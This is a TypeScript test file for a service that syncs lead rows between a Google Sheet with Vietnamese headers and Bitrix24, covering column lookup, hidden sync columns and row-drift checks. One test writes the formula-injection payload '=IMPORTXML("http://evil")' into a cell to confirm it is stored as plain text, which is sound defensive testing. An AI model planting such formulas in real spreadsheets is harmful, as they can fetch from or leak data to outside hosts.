import type { SheetsClient } from '@modules/google-sheets/index.js';

import { parseMapping } from '../domain/mapping-schema.js';
import { LeadSyncConfigError } from '../errors/index.js';
import { SheetTable } from '../services/sheet-table.service.js';
import { FakeSheetsClient } from './support/fake-sheets-client.js';

const mapping = parseMapping({
  version: 1,
  fields: [
    { column: 'Tên khách hàng', field: 'name', type: 'string', required: true },
    { column: 'Email', field: 'email', type: 'email' },
    { column: 'Số điện thoại', field: 'phone', type: 'phone' },
    { column: 'Ngân sách dự kiến', field: 'opportunity', type: 'number' },
  ],
});

const BUSINESS = ['Tên khách hàng', 'Email', 'Số điện thoại', 'Ngân sách dự kiến'];
const TECHNICAL = [
  'Trạng thái đồng bộ',
  'Lead ID Bitrix24',
  'Thời gian đồng bộ cuối',
  'Thông báo lỗi',
  'Sync Hash',
];
const KEYS = ['Email', 'Số điện thoại'];

const tableOf = (fake: FakeSheetsClient): SheetTable =>
  new SheetTable(fake as unknown as SheetsClient);

describe('SheetTable.load', () => {
  it('should turn rows into named cells with both renderings and the sync state', async () => {
    const fake = new FakeSheetsClient(
      [...BUSINESS, ...TECHNICAL],
      [
        [
          'An',
          'an@example.com',
          901234567,
          1500000,
          'Đã đồng bộ',
          '912',
          '2026-10-08 09:00:00',
          '',
          'v1:abc',
        ],
      ],
    );

    const snapshot = await tableOf(fake).load(mapping);

    expect(snapshot.headerRow).toBe(1);
    expect(snapshot.headers).toEqual([...BUSINESS, ...TECHNICAL]);
    expect(snapshot.columns['Email']).toBe(1);
    expect(snapshot.rows).toHaveLength(1);
    expect(snapshot.rows[0].rowNumber).toBe(2);
    expect(snapshot.rows[0].cells['Số điện thoại']).toEqual({
      formatted: '901234567',
      raw: 901234567,
    });
    expect(snapshot.rows[0].cells['Ngân sách dự kiến']).toEqual({
      formatted: '1500000',
      raw: 1500000,
    });
    expect(snapshot.rows[0].state).toEqual({
      leadId: '912',
      status: 'Đã đồng bộ',
      error: '',
      hash: 'v1:abc',
    });
    // One metadata read and one read per rendering.
    expect(fake.calls).toEqual({ read: 3, write: 0 });
  });

  it('should find columns by header text whatever their order, trimming the header', async () => {
    const fake = new FakeSheetsClient(
      [
        'Sync Hash',
        ' Email ',
        'Ghi chú riêng',
        'Tên khách hàng',
        'Số điện thoại',
        'Ngân sách dự kiến',
      ],
      [['v1:abc', 'an@example.com', 'x', 'An', '0901234567', '']],
    );

    const snapshot = await tableOf(fake).load(mapping);

    expect(snapshot.columns).toMatchObject({ 'Sync Hash': 0, Email: 1, 'Tên khách hàng': 3 });
    expect(snapshot.rows[0].cells['Email'].formatted).toBe('an@example.com');
    expect(snapshot.rows[0].state.hash).toBe('v1:abc');
  });

  it('should use the first of two columns with the same header', async () => {
    const fake = new FakeSheetsClient(
      ['Email', 'Tên khách hàng', 'Email'],
      [['a@x.vn', 'An', 'b@x.vn']],
    );

    const snapshot = await tableOf(fake).load(mapping);

    expect(snapshot.columns['Email']).toBe(0);
    expect(snapshot.rows[0].cells['Email'].formatted).toBe('a@x.vn');
  });

  it('should cope with short rows, blank rows and missing technical columns', async () => {
    const fake = new FakeSheetsClient(BUSINESS, [['An'], [], ['Bình', 'binh@example.com']]);

    const snapshot = await tableOf(fake).load(mapping);

    expect(snapshot.rows.map((row) => row.rowNumber)).toEqual([2, 3, 4]);
    expect(snapshot.rows[0].cells['Email']).toEqual({ formatted: '', raw: null });
    expect(snapshot.rows[1].cells['Tên khách hàng']).toEqual({ formatted: '', raw: null });
    expect(snapshot.rows[2].state).toEqual({ leadId: '', status: '', error: '', hash: '' });
  });

  it('should return no rows for a sheet that has only the header row', async () => {
    const snapshot = await tableOf(new FakeSheetsClient(BUSINESS, [])).load(mapping);

    expect(snapshot.rows).toEqual([]);
    expect(snapshot.headers).toEqual(BUSINESS);
  });

  it('should honour sheet.headerRow', async () => {
    const fake = new FakeSheetsClient(
      ['Danh sách lead quý 4'],
      [BUSINESS, ['An', 'an@example.com']],
    );

    const snapshot = await tableOf(fake).load({ ...mapping, sheet: { headerRow: 2 } });

    expect(snapshot.headers).toEqual(BUSINESS);
    expect(snapshot.rows.map((row) => row.rowNumber)).toEqual([3]);
  });

  it('should fail clearly when the header row is empty', async () => {
    await expect(tableOf(new FakeSheetsClient([], [])).load(mapping)).rejects.toThrow(
      new LeadSyncConfigError(
        'Hàng tiêu đề (hàng 1) đang trống; kiểm tra sheet.headerRow trong mapping',
      ),
    );
  });
});

describe('SheetTable.ensureTechnicalColumns', () => {
  it('should append the missing headers after the last column and hide Lead ID and Sync Hash', async () => {
    const fake = new FakeSheetsClient(BUSINESS, [['An', 'an@example.com']]);
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);

    await table.ensureTechnicalColumns(snapshot);

    expect(fake.grid[0]).toEqual([...BUSINESS, ...TECHNICAL]);
    expect(snapshot.headers).toEqual([...BUSINESS, ...TECHNICAL]);
    expect(snapshot.columns['Lead ID Bitrix24']).toBe(5);
    expect(fake.structureRequests).toEqual([
      {
        updateDimensionProperties: {
          range: { sheetId: 77, dimension: 'COLUMNS', startIndex: 5, endIndex: 6 },
          properties: { hiddenByUser: true },
          fields: 'hiddenByUser',
        },
      },
      {
        updateDimensionProperties: {
          range: { sheetId: 77, dimension: 'COLUMNS', startIndex: 8, endIndex: 9 },
          properties: { hiddenByUser: true },
          fields: 'hiddenByUser',
        },
      },
    ]);
  });

  it('should add only the columns that are missing and leave existing ones alone', async () => {
    const fake = new FakeSheetsClient([...BUSINESS, 'Lead ID Bitrix24', 'Trạng thái đồng bộ'], []);
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);

    await table.ensureTechnicalColumns(snapshot);

    expect(fake.grid[0].slice(4)).toEqual([
      'Lead ID Bitrix24',
      'Trạng thái đồng bộ',
      'Thời gian đồng bộ cuối',
      'Thông báo lỗi',
      'Sync Hash',
    ]);
    // Only the newly added Sync Hash column is hidden; a column the user un-hid stays visible.
    expect(fake.structureRequests).toHaveLength(1);
  });

  it('should grow the grid first when it has too few columns', async () => {
    const fake = new FakeSheetsClient(BUSINESS, []);
    fake.columnCount = 6;
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);

    await table.ensureTechnicalColumns(snapshot);

    expect(fake.structureRequests[0]).toEqual({
      appendDimension: { sheetId: 77, dimension: 'COLUMNS', length: 3 },
    });
  });

  it('should do nothing when every technical column exists', async () => {
    const fake = new FakeSheetsClient([...BUSINESS, ...TECHNICAL], []);
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);

    await table.ensureTechnicalColumns(snapshot);

    expect(fake.calls.write).toBe(0);
  });
});

describe('SheetTable.writeResults', () => {
  const rows = [
    ['An', 'an@example.com', '0901234567', ''],
    ['Bình', 'binh@example.com', '0912345678', ''],
  ];

  it('should write only the given cells of the given rows, in one request', async () => {
    const fake = new FakeSheetsClient(
      [...BUSINESS, ...TECHNICAL],
      rows.map((row) => [...row]),
    );
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);
    fake.setCell(3, 'Thông báo lỗi', 'lỗi cũ');
    fake.calls = { read: 0, write: 0 };

    const outcome = await table.writeResults(
      snapshot,
      [
        {
          rowNumber: 2,
          cells: {
            'Lead ID Bitrix24': '912',
            'Trạng thái đồng bộ': 'Đã đồng bộ',
            'Sync Hash': 'v1:abc',
          },
        },
        { rowNumber: 3, cells: { 'Trạng thái đồng bộ': 'Lỗi' } },
      ],
      KEYS,
    );

    expect(outcome).toEqual({ written: [2, 3], drifted: [] });
    expect(fake.cell(2, 'Lead ID Bitrix24')).toBe('912');
    expect(fake.cell(2, 'Sync Hash')).toBe('v1:abc');
    expect(fake.cell(3, 'Trạng thái đồng bộ')).toBe('Lỗi');
    expect(fake.cell(3, 'Thông báo lỗi')).toBe('lỗi cũ');
    // One re-read of the key columns, one write.
    expect(fake.calls).toEqual({ read: 1, write: 1 });
  });

  it('should not write to a row whose email or phone changed since it was read', async () => {
    const fake = new FakeSheetsClient(
      [...BUSINESS, ...TECHNICAL],
      rows.map((row) => [...row]),
    );
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);
    // The user sorted the sheet: rows 2 and 3 swapped places.
    fake.grid[1] = [...rows[1]];
    fake.grid[2] = [...rows[0]];

    const outcome = await table.writeResults(
      snapshot,
      [
        { rowNumber: 2, cells: { 'Lead ID Bitrix24': '912' } },
        { rowNumber: 3, cells: { 'Lead ID Bitrix24': '913' } },
      ],
      KEYS,
    );

    expect(outcome).toEqual({ written: [], drifted: [2, 3] });
    expect(fake.cell(2, 'Lead ID Bitrix24')).toBe('');
    expect(fake.calls.write).toBe(0);
  });

  it('should cut a long message at 500 characters and write text that looks like a formula as is', async () => {
    const fake = new FakeSheetsClient(
      [...BUSINESS, ...TECHNICAL],
      rows.map((row) => [...row]),
    );
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);

    await table.writeResults(
      snapshot,
      [
        { rowNumber: 2, cells: { 'Thông báo lỗi': 'x'.repeat(900) } },
        { rowNumber: 3, cells: { 'Thông báo lỗi': '=IMPORTXML("http://evil")' } },
      ],
      KEYS,
    );

    expect(fake.cell(2, 'Thông báo lỗi')).toHaveLength(500);
    expect(fake.cell(3, 'Thông báo lỗi')).toBe('=IMPORTXML("http://evil")');
  });

  it('should make no request when there is nothing to write', async () => {
    const fake = new FakeSheetsClient(
      [...BUSINESS, ...TECHNICAL],
      rows.map((row) => [...row]),
    );
    const table = tableOf(fake);
    const snapshot = await table.load(mapping);
    fake.calls = { read: 0, write: 0 };

    await expect(table.writeResults(snapshot, [], KEYS)).resolves.toEqual({
      written: [],
      drifted: [],
    });
    expect(fake.calls).toEqual({ read: 0, write: 0 });
  });
});
